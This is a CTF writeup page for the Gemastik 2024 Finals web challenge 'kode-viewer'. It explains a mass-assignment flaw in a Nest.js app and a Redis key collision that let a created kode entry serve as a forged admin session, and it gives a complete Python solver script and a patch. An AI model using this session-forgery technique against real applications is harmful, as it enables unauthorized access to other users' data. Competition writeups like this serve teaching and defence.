@@ -1,0 +1,140 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="CTF writeups, digital forensics, and cyber security notes by k3ng."><meta name="generator" content="Astro v7.1.1"><meta property="og:title" content="kode-viewer | k3ng.xyz"><meta property="og:description" content="CTF writeups, digital forensics, and cyber security notes by k3ng."><meta property="og:type" content="website"><link rel="icon" type="image/jpeg" href="/favicon.jpg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet"><title>kode-viewer | k3ng.xyz</title><script>
+      const savedTheme = localStorage.getItem('theme');
+      const preferredTheme = matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+      document.documentElement.dataset.theme = savedTheme || preferredTheme;
+    </script><link rel="stylesheet" href="/_astro/BaseLayout.DZwBvaeU.css"></head><body><header class="site-header"><div class="header-inner"><a class="wordmark" href="/" aria-label="Home">k3ng</a><nav aria-label="Primary navigation"><a href="/blog">Blog</a><a href="/writeups" aria-current="page">Writeups</a><a href="/about">About</a></nav><button class="theme-toggle" type="button" aria-label="Toggle color theme"><span class="theme-light" aria-hidden="true">☼</span><span class="theme-dark" aria-hidden="true">☾</span></button></div></header><main class="article-shell has-toc"><article><header class="article-header"><p class="eyebrow">Gemastik 2024 Finals</p><h1>kode-viewer</h1><ul class="article-tags" aria-label="Article tags"><li>nestjs</li><li>redis</li><li>mass-assignment</li><li>key-collision</li><li>session-forgery</li></ul></header><div class="prose"><h3 id="description">Description</h3>
+<p>Elevate your kode-share experience with kode-viewer.</p>
+<p>by vidner</p>
+<hr>
+<h3 id="analysis">Analysis</h3>
+<p>We are given full source-code of a website built using Nest.js. From the <code>docker-compose.yml</code> we can infer that the database used for this challenge is Redis.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="yaml"><code><span class="line"><span style="color:#7EE787">services</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">  kode-viewer</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">    build</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">      context</span><span style="color:#E6EDF3">: </span><span style="color:#79C0FF">.</span></span>
+<span class="line"><span style="color:#7EE787">      args</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">        - </span><span style="color:#A5D6FF">PASSWORD=root</span></span>
+<span class="line"><span style="color:#7EE787">    ports</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">'10000:3000'</span></span>
+<span class="line"><span style="color:#7EE787">    depends_on</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">redis</span></span>
+<span class="line"><span style="color:#7EE787">    environment</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">REDIS_HOST=redis</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">REDIS_PORT=6379</span></span>
+<span class="line"><span style="color:#7EE787">  redis</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">    image</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">public.ecr.aws/docker/library/redis:alpine</span></span>
+<span class="line"><span style="color:#7EE787">    volumes</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">./redis-data:/data</span></span></code></pre>
+<p>From the <code>kode.services.ts</code> file, we could see that the <code>create</code> function uses the whole <code>payload</code> argument and expands them when sending it to the Redis database. This is dangerous since we can add new keys outside of the <code>KodeDTO</code> type. The <code>payload</code> is not checked against the <code>KodeDTO</code> type since types are only a suggestion in TypeScript, rather than a strict rule.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="typescript"><code><span class="line"><span style="color:#8B949E">// snip</span></span>
+<span class="line"><span style="color:#E6EDF3">  async </span><span style="color:#D2A8FF">create</span><span style="color:#E6EDF3">(email: string, payload: KodeDTO) {</span></span>
+<span class="line"><span style="color:#E6EDF3">    payload.kind </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> payload.kind </span><span style="color:#FF7B72">?</span><span style="color:#A5D6FF"> 'private'</span><span style="color:#FF7B72"> :</span><span style="color:#A5D6FF"> 'public'</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">    const</span><span style="color:#79C0FF"> key</span><span style="color:#FF7B72"> =</span><span style="color:#A5D6FF"> `kode-${</span><span style="color:#E6EDF3">email</span><span style="color:#A5D6FF">}-${</span><span style="color:#E6EDF3">payload</span><span style="color:#A5D6FF">.</span><span style="color:#E6EDF3">name</span><span style="color:#A5D6FF">}-${</span><span style="color:#E6EDF3">payload</span><span style="color:#A5D6FF">.</span><span style="color:#E6EDF3">lang</span><span style="color:#A5D6FF">}-${</span><span style="color:#E6EDF3">payload</span><span style="color:#A5D6FF">.</span><span style="color:#E6EDF3">kind</span><span style="color:#A5D6FF">}`</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#79C0FF"> this</span><span style="color:#E6EDF3">.kv.</span><span style="color:#D2A8FF">set</span><span style="color:#E6EDF3">(key, { email, </span><span style="color:#FF7B72">...</span><span style="color:#E6EDF3">payload }, </span><span style="color:#79C0FF">1200</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"><span style="color:#8B949E">// snip</span></span></code></pre>
+<p>On the <code>list</code> function, we can see that we could only see our own kode if we are not an admin. But if we are an admin, we can see every kode on the database. So we would probably want to be an admin to get the flag.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="typescript"><code><span class="line"><span style="color:#8B949E">// snip</span></span>
+<span class="line"><span style="color:#E6EDF3">async </span><span style="color:#D2A8FF">list</span><span style="color:#E6EDF3">(user: Session) {</span></span>
+<span class="line"><span style="color:#FF7B72">    const</span><span style="color:#79C0FF"> kodes</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> user.isAdmin</span></span>
+<span class="line"><span style="color:#FF7B72">      ?</span><span style="color:#FF7B72"> await</span><span style="color:#79C0FF"> this</span><span style="color:#E6EDF3">.kv.</span><span style="color:#D2A8FF">find</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'kode-*'</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#FF7B72">      :</span><span style="color:#FF7B72"> await</span><span style="color:#79C0FF"> this</span><span style="color:#E6EDF3">.kv.</span><span style="color:#D2A8FF">find</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">`kode-${</span><span style="color:#E6EDF3">user</span><span style="color:#A5D6FF">.</span><span style="color:#E6EDF3">email</span><span style="color:#A5D6FF">}-*`</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#79C0FF"> this</span><span style="color:#E6EDF3">.</span><span style="color:#D2A8FF">parse</span><span style="color:#E6EDF3">(kodes);</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"><span style="color:#8B949E">// snip</span></span></code></pre>
+<h3 id="solution">Solution</h3>
+<p>To somehow overwrite the user, we need to look at how the session is implemented. The session token is just a random UUIDv4 and no sanitization is applied to it. </p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="typescript"><code><span class="line"><span style="color:#8B949E">// snip</span></span>
+<span class="line"><span style="color:#FF7B72">    const</span><span style="color:#79C0FF"> sessionId</span><span style="color:#FF7B72"> =</span><span style="color:#D2A8FF"> uuidv4</span><span style="color:#E6EDF3">();</span></span>
+<span class="line"><span style="color:#FF7B72">    await</span><span style="color:#79C0FF"> this</span><span style="color:#E6EDF3">.kv.</span><span style="color:#D2A8FF">set</span><span style="color:#E6EDF3">(sessionId, user, </span><span style="color:#79C0FF">1800</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#8B949E">// snip</span></span></code></pre>
+<p>Therefore, we can use a kode ID as a session token, where that kode is injected with an <code>isAdmin</code> with a value of <code>True</code> . This exploit is possible because of Redis, where it does not have a concept of tables. This means that if different types of objects are using the same database, the key must be identifiable to that type and also checked rigorously to avoid collisions like what is happening in this case.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E6EDF3">r </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> requests.post(</span><span style="color:#FF7B72">f</span><span style="color:#A5D6FF">"http://</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">ip</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">:</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">port</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">/kode"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#FFA657">                  data</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#A5D6FF">                     "name"</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">"asdf"</span><span style="color:#E6EDF3">, </span></span>
+<span class="line"><span style="color:#A5D6FF">                     "lang"</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">"python"</span><span style="color:#E6EDF3">, </span></span>
+<span class="line"><span style="color:#A5D6FF">                     "kode"</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">"hello"</span><span style="color:#E6EDF3">, </span></span>
+<span class="line"><span style="color:#A5D6FF">                     "isAdmin"</span><span style="color:#E6EDF3">: </span><span style="color:#79C0FF">True</span></span>
+<span class="line"><span style="color:#E6EDF3">                  },</span></span>
+<span class="line"><span style="color:#FFA657">                  headers</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">{</span><span style="color:#A5D6FF">"Cookie"</span><span style="color:#E6EDF3">: </span><span style="color:#FF7B72">f</span><span style="color:#A5D6FF">"session=</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">session</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#FFA657">                  allow_redirects</span><span style="color:#FF7B72">=</span><span style="color:#79C0FF">False</span></span>
+<span class="line"><span style="color:#E6EDF3">)</span></span></code></pre>
+<p>Then, the new kode can be interpreted as a session token and we can get all the kode in the database. On the remote service, the kode containing the flag will start with <code>flag</code> as the name and will be set to private.</p>
+<h3 id="solver-script">Solver Script</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#8B949E">#!/usr/bin/env python3</span></span>
+<span class="line"><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> requests</span></span>
+<span class="line"><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> sys</span></span>
+<span class="line"><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> re</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">ip </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> sys.argv[</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">]</span></span>
+<span class="line"><span style="color:#E6EDF3">port </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "10000"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">EMAIL</span><span style="color:#FF7B72"> =</span><span style="color:#A5D6FF"> "a@aa.com"</span></span>
+<span class="line"><span style="color:#79C0FF">PASSWORD</span><span style="color:#FF7B72"> =</span><span style="color:#A5D6FF"> "dasdnnsaldnsa"</span></span>
+<span class="line"><span style="color:#79C0FF">PAYLOAD</span><span style="color:#FF7B72"> =</span><span style="color:#A5D6FF"> "kode-a@aa.com-asdf-python-public"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">r </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> requests.post(</span><span style="color:#FF7B72">f</span><span style="color:#A5D6FF">"http://</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">ip</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">:</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">port</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">/auth/register"</span><span style="color:#E6EDF3">, </span></span>
+<span class="line"><span style="color:#FFA657">                  data</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">{</span><span style="color:#A5D6FF">"email"</span><span style="color:#E6EDF3">: </span><span style="color:#79C0FF">EMAIL</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"password"</span><span style="color:#E6EDF3">: </span><span style="color:#79C0FF">PASSWORD</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">r </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> requests.post(</span><span style="color:#FF7B72">f</span><span style="color:#A5D6FF">"http://</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">ip</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">:</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">port</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">/auth/login"</span><span style="color:#E6EDF3">, </span></span>
+<span class="line"><span style="color:#FFA657">                  data</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">{</span><span style="color:#A5D6FF">"email"</span><span style="color:#E6EDF3">: </span><span style="color:#79C0FF">EMAIL</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"password"</span><span style="color:#E6EDF3">: </span><span style="color:#79C0FF">PASSWORD</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#FFA657">                  allow_redirects</span><span style="color:#FF7B72">=</span><span style="color:#79C0FF">False</span></span>
+<span class="line"><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">session </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> r.cookies[</span><span style="color:#A5D6FF">"session"</span><span style="color:#E6EDF3">]</span></span>
+<span class="line"><span style="color:#E6EDF3">r </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> requests.post(</span><span style="color:#FF7B72">f</span><span style="color:#A5D6FF">"http://</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">ip</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">:</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">port</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">/kode"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#FFA657">                  data</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#A5D6FF">                     "name"</span><span style="color:#E6EDF3">: </span></span>
+<span class="line"><span style="color:#A5D6FF">                     "asdf"</span><span style="color:#E6EDF3">, </span></span>
+<span class="line"><span style="color:#A5D6FF">                     "lang"</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">"python"</span><span style="color:#E6EDF3">, </span></span>
+<span class="line"><span style="color:#A5D6FF">                     "kode"</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">"hello"</span><span style="color:#E6EDF3">, </span></span>
+<span class="line"><span style="color:#A5D6FF">                     "isAdmin"</span><span style="color:#E6EDF3">: </span><span style="color:#79C0FF">True</span></span>
+<span class="line"><span style="color:#E6EDF3">                  },</span></span>
+<span class="line"><span style="color:#FFA657">                  headers</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">{</span><span style="color:#A5D6FF">"Cookie"</span><span style="color:#E6EDF3">: </span><span style="color:#FF7B72">f</span><span style="color:#A5D6FF">"session=</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">session</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">},</span></span>
+<span class="line"><span style="color:#FFA657">                  allow_redirects</span><span style="color:#FF7B72">=</span><span style="color:#79C0FF">False</span></span>
+<span class="line"><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">session </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> PAYLOAD</span></span>
+<span class="line"><span style="color:#E6EDF3">r </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> requests.get(</span></span>
+<span class="line"><span style="color:#FF7B72">    f</span><span style="color:#A5D6FF">"http://</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">ip</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">:</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">port</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">/kode"</span><span style="color:#E6EDF3">, </span></span>
+<span class="line"><span style="color:#FFA657">    headers</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">{</span><span style="color:#A5D6FF">"Cookie"</span><span style="color:#E6EDF3">: </span><span style="color:#FF7B72">f</span><span style="color:#A5D6FF">"session=</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">session</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">}</span></span>
+<span class="line"><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">flags </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> r.text</span></span>
+<span class="line"><span style="color:#E6EDF3">flag_urls </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> re.findall(</span><span style="color:#FF7B72">r</span><span style="color:#A5D6FF">"</span><span style="color:#7EE787;font-weight:bold">\"</span><span style="color:#79C0FF">.</span><span style="color:#FF7B72">*</span><span style="color:#A5D6FF">flag_</span><span style="color:#79C0FF">.</span><span style="color:#FF7B72">*</span><span style="color:#A5D6FF">-private</span><span style="color:#7EE787;font-weight:bold">\"</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">, flags)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">for</span><span style="color:#E6EDF3"> flag_url </span><span style="color:#FF7B72">in</span><span style="color:#E6EDF3"> flag_urls:</span></span>
+<span class="line"><span style="color:#E6EDF3">    flag_url </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> flag_url.replace(</span><span style="color:#A5D6FF">"</span><span style="color:#FF7B72">\"</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">""</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    r </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> requests.get(</span></span>
+<span class="line"><span style="color:#FF7B72">        f</span><span style="color:#A5D6FF">"http://</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">ip</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">:</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">port</span><span style="color:#FF7B72">}{</span><span style="color:#E6EDF3">flag_url</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">, </span></span>
+<span class="line"><span style="color:#FFA657">        headers</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">{</span><span style="color:#A5D6FF">"Cookie"</span><span style="color:#E6EDF3">: </span><span style="color:#FF7B72">f</span><span style="color:#A5D6FF">"session=</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">session</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">}</span></span>
+<span class="line"><span style="color:#E6EDF3">     )</span></span>
+<span class="line"><span style="color:#79C0FF">    print</span><span style="color:#E6EDF3">(r.text, </span><span style="color:#FFA657">flush</span><span style="color:#FF7B72">=</span><span style="color:#79C0FF">True</span><span style="color:#E6EDF3">)</span></span></code></pre>
+<h3 id="patch">Patch</h3>
+<p>Since the culprit is the <code>create</code> function, we can patch it to only insert the keys that is defined by <code>KodeDTO</code>. </p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="typescript"><code><span class="line"><span style="color:#8B949E">// snip</span></span>
+<span class="line"><span style="color:#E6EDF3">  async </span><span style="color:#D2A8FF">create</span><span style="color:#E6EDF3">(email: string, payload: KodeDTO) {</span></span>
+<span class="line"><span style="color:#E6EDF3">    payload.kind </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> payload.kind </span><span style="color:#FF7B72">?</span><span style="color:#A5D6FF"> 'private'</span><span style="color:#FF7B72"> :</span><span style="color:#A5D6FF"> 'public'</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">    const</span><span style="color:#79C0FF"> key</span><span style="color:#FF7B72"> =</span><span style="color:#A5D6FF"> `kode-${</span><span style="color:#E6EDF3">email</span><span style="color:#A5D6FF">}-${</span><span style="color:#E6EDF3">payload</span><span style="color:#A5D6FF">.</span><span style="color:#E6EDF3">name</span><span style="color:#A5D6FF">}-${</span><span style="color:#E6EDF3">payload</span><span style="color:#A5D6FF">.</span><span style="color:#E6EDF3">lang</span><span style="color:#A5D6FF">}-${</span><span style="color:#E6EDF3">payload</span><span style="color:#A5D6FF">.</span><span style="color:#E6EDF3">kind</span><span style="color:#A5D6FF">}`</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#79C0FF"> this</span><span style="color:#E6EDF3">.kv.</span><span style="color:#D2A8FF">set</span><span style="color:#E6EDF3">(key, { email, kind: payload.kind, name: payload.name, lang: payload.lang, kode: payload.kode }, </span><span style="color:#79C0FF">1200</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"><span style="color:#8B949E">// snip</span></span></code></pre>
+<p>But after the competition, we realized that there are other exploits other than ours. So the true patch is to not use Redis as your main database xD.</p></div></article><aside class="toc" aria-label="On this page"><p>On this page</p><ol><li class="nested"><a href="#description">Description</a></li><li class="nested"><a href="#analysis">Analysis</a></li><li class="nested"><a href="#solution">Solution</a></li><li class="nested"><a href="#solver-script">Solver Script</a></li><li class="nested"><a href="#patch">Patch</a></li></ol></aside></main><footer class="site-footer"><div><span>k3ng.xyz</span><span class="footer-note">2026</span></div></footer><script>
+      document.querySelector('.theme-toggle')?.addEventListener('click', () => {
+        const theme = document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark';
+        const updateTheme = () => {
+          document.documentElement.dataset.theme = theme;
+          localStorage.setItem('theme', theme);
+        };
+
+        if (document.startViewTransition) {
+          document.startViewTransition(updateTheme);
+          return;
+        }
+
+        document.documentElement.classList.add('theme-transition');
+        updateTheme();
+        setTimeout(() => document.documentElement.classList.remove('theme-transition'), 650);
+      });
+    </script></body></html>
